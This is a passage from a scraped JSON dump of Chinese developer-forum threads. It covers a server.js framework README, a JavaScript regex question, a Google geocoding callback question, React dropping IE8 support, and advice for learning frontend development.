"就是写字不方便，没文字总画错😂\r", "准备入手个手写笔试试写字"]},
{"content": "", "reply": "19", "tittle": "吐槽过电梯算法？快来玩 ", "comment": ["玩了一下，这 API 真难用啊！怪不得那么多电梯算法那么烂！", "nice game", "电梯不都是 PLC 控制的吗 ", "   ", " ", " 是的，觉得拿计算机语言实现电梯很简单？请试试拿梯形图把逻辑做出来就知道难度了。不过这锅还是只能电气工程师背，梯形图本来的目的就是让工程师在不会计算机语言的情况下也能写逻辑。", "好玩", "厉害", "测试了几关后，发现电梯调度算法不是那么容易实现的。", "API 太难用了+1", "好玩，加速（ 55X ）测试了一下 solution - - 第十关就卡死在那了\r", "还是自己慢慢一个一个玩吧", "电梯算法非常恶心，记得我们实验课时的 5 层电梯设计…最难的一个了………", "我以后再也不吐槽电梯了。。。", "好玩", "吐槽 API 难用的，有种东西叫 Pull Request ，请贡献你们的智慧。", " 修改 API 的 PR 你觉得能通过么？", "好玩！", " 这有啥不能的？这又不是什么被广泛应用的库或者框架，要考虑兼容考虑各种影响。这就是个游戏，最多是 wiki 上的 solution 会 fail 。", " 是我品味低吗，我觉得这 api 挺好用的样子", "哈哈，有意思", "作者居然是我的前同事... :-|"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>项目地址： <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/yisheng/AppScreenshot\">https://github.com/yisheng/AppScreenshot</a></p>\n\n<h1>Preview</h1>\n\n<p><img src=\"https://raw.githubusercontent.com/yisheng/AppScreenshot/master/assets/sample.png\" alt=\"Sample Preview\"></p>\n\n<h1>原理</h1>\n\n<p>项目包含 3 个部分：</p>\n\n<ol>\n<li>NodeJS 托管用于给截图设置样式的网页</li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"http://phantomjs.org/\">PhantomJS</a> 用于把第 1 步的网页截图成 png 文件</li>\n<li><code>sh</code> 文件用于执行第 2 步的 <code>phantomjs</code> 命令，生成所有尺寸的截图</li>\n</ol>\n\n<h1>TODO</h1>\n\n<ul>\n<li>多模板支持</li>\n</ul>\n</div></div>"], "reply": "目前尚无回", "tittle": "开源：将原生 App 截图自动转成漂亮的 App Store 截图的工具", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.github.com/menway/serverjs\">Server.js</a></h1>\n\n<p>Write server code in frontend JavaScript files, and more.</p>\n\n<p>The purpose of this project is to unify all JavaScript code in frontend js files. With the support of server.js solution, frontend developers are now able to embed backend codes in fontend js files.</p>\n\n<p>Thanks to node.js, JavaScript developers now can write one single language for both frontend and backend. But due to different host environments, the developers coming from frontend world usually need a lot of time to learn about backend development skills before getting their first node.js app running. And although frontend and backend codes are written in the same language, they are not organized well -  they have to be physically divided in fontend and backend files. This will bring much effort for further development, which usually involves code changes on both ends and also in their communicating interfaces.</p>\n\n<p>Some existing solutions move the fontend codes to backend. For example, <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.meteor.com\">Meteor</a> allows developers to combine codes for both ends in the same backend js file. Server.js does the similar thing, but on the opposite direction, which allows embedding server code in frontend js files. According to my project experiences, most functionalities of a web app is triggered by the frontend events, from end user's web browser. So I believe it's more reasonable to move code to the front, that the events get processed at the same place where they occurred.</p>\n\n<p>Imagine that you are designing the login page for your web app. There's an input for username and another one for password and at the bottom a login button. Once the user clicks the login button, your <code>onclick</code> event handler is triggered, where you get the entered username and password. In traditional way, you have to submit the form to backend or write AJAX code to communicate with backend in order to get the register result, and you'll also need write backend code to receive and process this request and produce register result, in another backend js file. With server.js, you can now write code to directly check backend database right in your <code>onclick</code> event handler. How wonderful it is!</p>\n\n<p>The ideal use case of server.js is that the developer only need play attention to frontend files and keep backend untouched, and everything just go well.</p>\n\n<h2>Installation</h2>\n<div class=\"highlight\"><pre>mkdir your_project\n<span class=\"nb\">cd </span>your_project\nnpm install serverjs --save\n</pre></div>\n\n<h2>Quick start</h2>\n\n<p>Under your project directory, create file <code>app.js</code> and write your app code (as easy as one line of code)</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// app.js</span>\n<span class=\"p\">(</span><span class=\"k\">new</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'serverjs'</span><span class=\"p\">)).</span><span class=\"nx\">start</span><span class=\"p\">();</span>\n</pre></div>\n\n<p>And then start you app with node.js.</p>\n<div class=\"highlight\"><pre>node app.js\n</pre></div>\n\n<p>Now the server is running at port 3000. Open your web browser and navigate to <a target=\"_blank\" rel=\"nofollow\" href=\"http://localhost:3000\">http://localhost:3000</a> you'll see a default <code>Hello, World</code> web page while the same message is printed in backend console.</p>\n<div class=\"highlight\"><pre>&gt; node app.js\n<span class=\"o\">===================================================</span>\nServer.js running at port <span class=\"m\">3000</span> in development mode.\n<span class=\"o\">===================================================</span>\nHello, World\n</pre></div>\n\n<h2>Directory structure</h2>\n\n<p>You may have noticed that in your project directory, a sub-directory named <code>public</code> is automatically created on your first run, which is the root folder for your website. The default <code>index.html</code> and <code>index.js</code> files are also created for a start (home page). You can also put your other html files, js files and all assets under this directory. Once you put an html file as well as a js file with the same file name, the js file will be automatically embedded in that html file within a <code>script</code> tag. This follows the principle of convention over configuration, which you'll see in many places in server.js solution.</p>\n<div class=\"highlight\"><pre>your_project/\n    app.js\n    public/\n        index.html\n        index.js\n</pre></div>\n\n<h2>Hot code reload</h2>\n\n<p>Inspired by <a target=\"_blank\" rel=\"nofollow\" href=\"http://www.meteor.com\">Meteor</a>, hot code reload is a very useful feature during development process. Server.js also introduces this technology, which means if any file under <code>public</code> directory has been changed, the web browser will be automatically reloaded to reflect the change. You don't need to manually reload the page for every update.</p>\n\n<h2>How to code</h2>\n\n<p>Once you place the server code directive <code>'server code'</code> on the first line of a function (or the second line, right after <code>'use strict'</code>), it'll become a backend function, and you can write your backend code directly in it. To invoke this backend function from frontend, besides all original parameters for this function, just put an <em>Error-First Callback</em> at the end, as you usually do in most async function calls.</p>\n\n<p>Following are several quick demos. Try to put them in your <code>index.js</code> file and see the results.</p>\n\n<h3>Hello, world (default)</h3>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">hello</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'Hello, world!'</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">hello</span><span class=\"p\">();</span>\n</pre></div>\n\n<h3>Hello, world (anonymous function)</h3>\n<div class=\"highlight\"><pre><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"s1\">'Hello, world!'</span><span class=\"p\">);</span>\n<span class=\"p\">})();</span>\n</pre></div>\n\n<h3>Node version</h3>\n<div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">getNodeVersion</span><span class=\"p\">(</span><span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"nx\">process</span><span class=\"p\">.</span><span class=\"nx\">version</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">getNodeVersion</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">ver</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'Node version: '</span> <span class=\"o\">+</span> <span class=\"nx\">ver</span><span class=\"p\">);</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<h3>File system</h3>\n<div class=\"highlight\"><pre><span class=\"kd\">var</span> <span class=\"nx\">readdir</span> <span class=\"o\">=</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">fs</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'fs'</span><span class=\"p\">);</span>\n  <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">readdir</span><span class=\"p\">(</span><span class=\"nx\">__dirname</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">readdir</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">files</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'Error!'</span><span class=\"p\">);</span>\n    <span class=\"k\">return</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'Files:\\n'</span> <span class=\"o\">+</span> <span class=\"nx\">files</span><span class=\"p\">.</span><span class=\"nx\">join</span><span class=\"p\">(</span><span class=\"s1\">'\\n'</span><span class=\"p\">));</span>\n<span class=\"p\">});</span>\n</pre></div>\n\n<h2>Template engine</h2>\n\n<p>Server.js uses <a target=\"_blank\" rel=\"nofollow\" href=\"http://handlebarsjs.com/\">handlebars</a> as the template engine. One of the benifits of using handlebars rather than other template engines is that it's compliant with plain html pages and requires little time to get familiar with. Following is a sample view written in handlebars. Handlebars support expressions, paths, helpers and many other useful features. For more detailed information, please refer to handlebars' official web page.</p>\n<div class=\"highlight\"><pre><span class=\"cp\">&lt;!doctype html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    {{#if true}}\n      Hello, world!\n    {{else}}\n      Never reach here.\n    {{/if}}\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</pre></div>\n\n<h2>The main function</h2>\n\n<p>One of the features of the template engine is that it accepts an initial object (aka context) and renders the web page using its value. In server.js you can output this initial object in the main function. As the similar definition of the main function in other programming languages, it is the entry of a web page and be executed only once. The object you return from the main function will be passed to template engine to render the web page. The main function need be named as <code>main</code> and contain the <code>server code</code> directive. Following is a sample of the main function.</p>\n<div class=\"highlight\"><pre><span class=\"c\">&lt;!-- index.html --&gt;</span>\n<span class=\"cp\">&lt;!doctype html&gt;</span>\n<span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    Hello, {{name}}.\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"c1\">// index.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">main</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"k\">return</span> <span class=\"p\">{</span><span class=\"nx\">name</span><span class=\"o\">:</span> <span class=\"s1\">'Menway'</span><span class=\"p\">};</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<h2>Easy routing</h2>\n\n<p>Server.js automatically convert your static html file as a route by emitting its extention name. For example, you can access <code>/public/login.html</code> via <code>http://your-domain.com/login</code>.</p>\n\n<p>Server.js also introduces an easy way for routing system. The traditional way of routing static files requires nested directory structure, but in server.js, you can use a well defined file name to do the same thing. Just simply place a comma as the separator between route levels.</p>\n\n<p>For example, if you need define route <code>/users/profile</code>, instead of create <code>/public/users/profile.html</code>, you can simply create <code>/public/users,profile.html</code>, and it can be accessed via <code>http://your-domain/users/profile</code>. Use the same file name for your js file and they will be mapped.</p>\n\n<h3>Route parameters</h3>\n\n<p>You can also place route parameters in the file name, wrapped by parenthesis. For example, <code>/public/users,profile,(username).html</code> will accept <code>/users/profile/alice</code>. And then in your main function, you can read <code>username</code> from input parameter.</p>\n\n<p>Example:</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// users,profile,(username).js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">main</span><span class=\"p\">(</span><span class=\"nx\">username</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">username</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>Another example:</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// categories,(cat),books,(book).js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">main</span><span class=\"p\">(</span><span class=\"nx\">cat</span><span class=\"p\">,</span> <span class=\"nx\">book</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">cat</span><span class=\"p\">,</span> <span class=\"nx\">book</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>Note: the names of function parameters should be exact the same as the names in the route file name, but the order can be different.</p>\n\n<h2>Shared functions</h2>\n\n<p>You can define a global name for your server code function by appending the name to server code directive. And then the function code can be globally shared for both frontend and backed, even in different js files. To invoke this shared function, use <code>Server.call()</code>. For example,</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// a.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">add</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code add'</span><span class=\"p\">;</span>\n  <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"nx\">a</span> <span class=\"o\">+</span> <span class=\"nx\">b</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// b.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">testAdd</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"mi\">1234</span><span class=\"p\">;</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"mi\">5678</span><span class=\"p\">;</span>\n  <span class=\"nx\">Server</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"s1\">'add'</span><span class=\"p\">,</span> <span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// c.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">onclick</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"nb\">parseFloat</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">'a'</span><span class=\"p\">).</span><span class=\"nx\">value</span><span class=\"p\">);</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"nb\">parseFloat</span><span class=\"p\">(</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">'b'</span><span class=\"p\">).</span><span class=\"nx\">value</span><span class=\"p\">);</span>\n  <span class=\"nx\">Server</span><span class=\"p\">.</span><span class=\"nx\">call</span><span class=\"p\">(</span><span class=\"s1\">'add'</span><span class=\"p\">,</span> <span class=\"nx\">a</span><span class=\"p\">,</span> <span class=\"nx\">b</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">,</span> <span class=\"nx\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"nx\">result</span><span class=\"p\">);</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>Note: you can also use dot characters (<code>.</code>) in the name of a shared function, e.g., <code>'server code users.add';</code>.</p>\n\n<h2>RESTful API</h2>\n\n<p>You can expose your server code function as a RESTful API by appending a desired route name and a http verb to the server code directive. The route name should begin with a slash character (<code>/</code>) and the http verb should be one of <code>get</code>, <code>post</code>, <code>update</code> and <code>delete</code> in lowercases. If the desired route name is omitted, the name of current route is used where the function is defined. If the http verb is omitted, <code>get</code> will be used by default. The values of the paramters are retrieved from the HTTP request header or body with the same names. Following is an example.</p>\n<div class=\"highlight\"><pre><span class=\"c1\">// register.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">register</span><span class=\"p\">(</span><span class=\"nx\">username</span><span class=\"p\">,</span> <span class=\"nx\">password</span><span class=\"p\">,</span> <span class=\"nx\">callback</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code /register post'</span><span class=\"p\">;</span>\n  <span class=\"c1\">// here you can ommit the route name and just write 'server code post' because /register is the current route</span>\n  <span class=\"c1\">// this function is now accessible via POST /register, with username and password in the HTTP request header or body</span>\n\n  <span class=\"c1\">// register this user</span>\n  <span class=\"c1\">// ...</span>\n\n  <span class=\"c1\">// callback(err, data)</span>\n  <span class=\"nx\">callback</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">,</span> <span class=\"p\">{</span><span class=\"nx\">username</span><span class=\"o\">:</span> <span class=\"nx\">username</span><span class=\"p\">});</span>\n  <span class=\"c1\">// if err doesn't exist, an HTTP 200 code is produced, otherwise, use new Error(code)</span>\n  <span class=\"c1\">// if data exists, it will be rendered in json format</span>\n<span class=\"p\">}</span>\n\n<span class=\"kd\">function</span> <span class=\"nx\">onsubmit</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">username</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#username'</span><span class=\"p\">).</span><span class=\"nx\">val</span><span class=\"p\">();</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">password</span> <span class=\"o\">=</span> <span class=\"nx\">$</span><span class=\"p\">(</span><span class=\"s1\">'#password'</span><span class=\"p\">).</span><span class=\"nx\">val</span><span class=\"p\">();</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"nx\">username</span><span class=\"o\">:</span> <span class=\"nx\">username</span><span class=\"p\">,</span> <span class=\"nx\">password</span><span class=\"o\">:</span> <span class=\"nx\">password</span><span class=\"p\">};</span>\n  <span class=\"nx\">$</span><span class=\"p\">.</span><span class=\"nx\">post</span><span class=\"p\">(</span><span class=\"s1\">'/register'</span><span class=\"p\">,</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">data</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"s1\">'Welcome, '</span> <span class=\"o\">+</span> <span class=\"nx\">data</span><span class=\"p\">.</span><span class=\"nx\">username</span><span class=\"p\">);</span>\n  <span class=\"p\">},</span> <span class=\"s1\">'json'</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>Note: you can also expose a shared function as a RESTful API function. In this case, you need put shared function name, route name and verb after server code directive, e.g., <code>'server code register /register post'</code>.</p>\n\n<h2>Global variables</h2>\n\n<p>Following global variables are pre-defined in server.js.</p>\n\n<table><thead>\n<tr>\n<th>Variable Name</th>\n<th>Scope</th>\n<th>Description</th>\n</tr>\n</thead><tbody>\n<tr>\n<td>Server</td>\n<td>frontend, backend</td>\n<td>delegate of the server</td>\n</tr>\n<tr>\n<td>Client</td>\n<td>backend</td>\n<td>delegate of the client</td>\n</tr>\n<tr>\n<td>Session</td>\n<td>backend</td>\n<td>current user's session data</td>\n</tr>\n<tr>\n<td>Request</td>\n<td>backend</td>\n<td>current request data</td>\n</tr>\n<tr>\n<td>Response</td>\n<td>backend</td>\n<td>current response data</td>\n</tr>\n</tbody></table>\n\n<h2>Security considerations</h2>\n\n<p>During server code RPC, <code>function</code> typed paramters are not allowed to be transferred to the backend to avoid code injection.</p>\n\n<p>In development mode, server codes are published to frontend for a better debugging, but in production mode, implementation details of server codes are hidden.</p>\n\n<p>Also user friendly errors are disabled in production mode.</p>\n\n<h2>Development mode</h2>\n\n<p>Development mode is enabled by default. You can change this setting to production mode by:</p>\n\n<ul>\n<li>environment variable in shell <code>NODE_ENV=production node app.js</code></li>\n<li>initialization option in app.js <code>(new require('serverjs')).start({mode: 'production'})</code></li>\n</ul>\n\n<p>Behavior differences between development mode and production mode are listed as below.</p>\n\n<table><thead>\n<tr>\n<th>Feature</th>\n<th>Development mode</th>\n<th>Production Mode</th>\n</tr>\n</thead><tbody>\n<tr>\n<td>hot code reload</td>\n<td>yes</td>\n<td>no</td>\n</tr>\n<tr>\n<td>routers cache</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>js file cache</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>js file minify</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>server code hiding</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>default service port</td>\n<td>3000</td>\n<td>80</td>\n</tr>\n<tr>\n<td>html file minify</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>gzip compression</td>\n<td>no</td>\n<td>yes</td>\n</tr>\n<tr>\n<td>user friendly errors</td>\n<td>yes</td>\n<td>no</td>\n</tr>\n</tbody></table>\n\n<h2>CoffeeScript support</h2>\n\n<p>Server.js is written in CoffeeScript, which is then compiled into JavaScript. I like CoffeeScript so much because it saved a lot of time during development, so I'd like to recommend you to use it in your development too. CoffeeScript is supported out of the box. To use it, instead of writing js files, </p>\n\n<h2>Third-party modules support</h2>\n\n<p>Just as regular node.js applications, you can install any third-party modules by <code>npm install</code>. Take mongodb module as an example.</p>\n<div class=\"highlight\"><pre>&gt; npm install mongodb --save\n</pre></div>\n<div class=\"highlight\"><pre><span class=\"c1\">// db.js</span>\n<span class=\"kd\">function</span> <span class=\"nx\">db</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"s1\">'server code'</span><span class=\"p\">;</span>\n  <span class=\"kd\">var</span> <span class=\"nx\">mongo</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'mongodb'</span><span class=\"p\">);</span>\n\n  <span class=\"c1\">// use mongo</span>\n  <span class=\"c1\">// ...</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<h2>License</h2>\n\n<p>MIT</p>\n</div></div>"], "reply": "1", "tittle": "准备开发个在前段 js 文件里面写后段代码的 server.js，大家觉得会有帮助吗？", "comment": ["感觉就像是乱七八糟各种功能揉在一块，这种为追求功能强大而牺牲灵活性的设计方式，对一个信 unix 哲学的人来说是无法接受的"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://facebook.github.io/react/blog/2016/01/12/discontinuing-ie8-support.html\" rel=\"nofollow\">https://facebook.github.io/react/blog/2016/01/12/discontinuing-ie8-support.html</a></div>"], "reply": "16", "tittle": "React 以后不再支持 IE8 了", "comment": ["以后微软， Bootstrap ， React 都不再支持 IE8 了", "不怕，又出来个微信。。。", "好事", "然后没有一个支持微信啊哈哈哈", " \r", " 你们知道现在移动设备的浏览器相对于桌面的有多友好吗？", "国内看百度统计 ie8 还占了 21%，不知道里面有多少是 360 游览器，看着真揪心。", " 如果是 360 我记得可以加上一行“<meta name=\"renderer\" content=\"webkit\">”", "好些大型软件开发周期过了以后都会这样", " 找到个文档： ", " 这个我知道，主要是 ie8 的统计数据不准确，无法根据这个数据来判断是否要支持 ie8", " @", " 那搜狗浏览器呢？", " 国产壳子浏览器都是 IE7 内核吧", " 自从换用自己的内核之后，安卓版微信的内置浏览器坑太多了，还好 iOS 版受到苹果的限制不能瞎搞。", "貌似我用 react 做微信上的开发，没遇到多少坑", " MS 已经宣布不支持 IE 10 了。", " 大部分都是 Chrome 换肤品。"]},
{"content": ["<div class=\"topic_content\">如题， HTML 和 CSS 以前有学过， Node.js 在 0.12 版本的时候也学个大概，能建个基本论坛的样子。之后转 iOS 开发，最近突然又想学点前端的东西，回头看，发现前端这一年变化好大。目前准备上手 vue ，求给点意见。</div>"], "reply": "4", "tittle": "iOS 开发人员，准备学点前端的知识。求给点意见。", "comment": ["同求", "react", "原来是做 android ，前段时间研究过一阵前端，贴一下我在知乎的回答，你可以参考一下。我没用过 vue ，不过应该差不多， vue 应该更轻量一点。\r", "\r", "知乎链接 ", "\r", "\r", "以下为知乎答案 ————————————————————————————\r", "\r", "虽然我不是零基础,在一个半月前，对前端(JS 全端?)这块我是一窍不通的。然而在一个半月以后，我已经能利用 nodejs+express+angular+mongodb 仿一个简单的知乎了。你可以看我的这个项目 threezj/ZhihuCopy · GitHub\r", "——————————————————————————\r", "学习路线\r", "1.baidu-ife/ife · GitHub 百度前端技术学院。非常好非常好的项目，对新人十分友善。分四个 task ，每次都会有详细的学习资料提供，跟着这个项目的步骤来，差不多大半个月 html+css+javascript 基础就都可以了。\r", "2.接下来学习框架,在如今这个前端框架满天飞的年代。我个人建议还是学好 jquery 和 angular.js ，重点是 angular.js. 推荐资料 pro angularjs 和官方文档。或者 网易云课堂 金旭亮老师的课程中也有详细介绍 angular 的，可以看看。\r", "3.后端 nodejs 推荐资料 《 nodejs 入门》 《 nodejs 开发指南》。另外自己看一下 express 的文档\r", "4.mongodb 我没怎么仔细了解，属于边用边看文档的阶段。", "copy 知乎的项目地址是  "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>function division(e, f) {<br>\n        (new google.maps.Geocoder).geocode({<br>\n            location : {<br>\n                lat : e,<br>\n                lng : f<br>\n            }<br>\n        }, function(c, d) {<br>\n            console.log(c,d)<br>\n            //返回这里的结果<br>\n             }<br>\n}; <br>\n想这样调用的话是肯定不行的<br>\nvar a=division(22,102)</p>\n\n<p>求高手帮下忙啊</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "咨询高手 google 的 geocoding 写在函数里面的话，怎么才能够接收返回呢，还是用 promise，如果用 promise 怎么写代码呢", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>现在有类似<code>/:wx/:dx/:am/:am/:ss/:tx/:ck/:fd/:kbz/:bin</code>这样的字符串，需要把每个以 /:开头的后面连着字母的字符串提取出来，需要怎么做？<br>\n<code><br>\nvar str = \"/:wx/:dx/:am/:am/:ss/:tx/:ck/:fd/:kbz/:bin\"<br>\nvar pat1 = /(\\/:[a-zA-Z]+)+/g;<br>\nvar pat2 = /(\\/:[a-zA-Z]+)+/<br>\npat1.exec(str)<br>\npat2.exec(str)<br>\n</code><br>\n都只能取一个，我现在需要把所有的都取出来，应该怎么做？</p>\n</div></div>"], "reply": "8", "tittle": "请教一个 js 正则的问题？", "comment": ["str.match(/(\\/:[a-zA-Z]+)/g)", "exec 是一个一个取的，除非你用 while", "    可行，多谢\r", "  按 1 楼的搞定了，多谢", "直接用 split 不就好了。", "split('/:') 最好。", "'/:wx/:dx/:am/:am/:ss/:tx/:ck/:fd/:kbz/:bin'.match(/(\\:[a-z]+)/g)", "- -明显 split ……除非是故意想学习正则表达式，怎么会想到用这么复杂的办法……", " 这些字符串是一个个表情，有可能表情后面直接跟着文字， split 文字也会跟过来"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>引用的视频默认是播放弹幕的</p>\n\n<p>但是有些视频因为弹幕太多 导致基本无法观看了！</p>\n\n<p>有办法实现吗</p>\n</div></div>"], "reply": "2", "tittle": "可不可以在引用 AB 站视频时 默认关闭弹幕选项", "comment": ["\r", "\r", "希望能帮到你", " 好嗒 我看看"]},
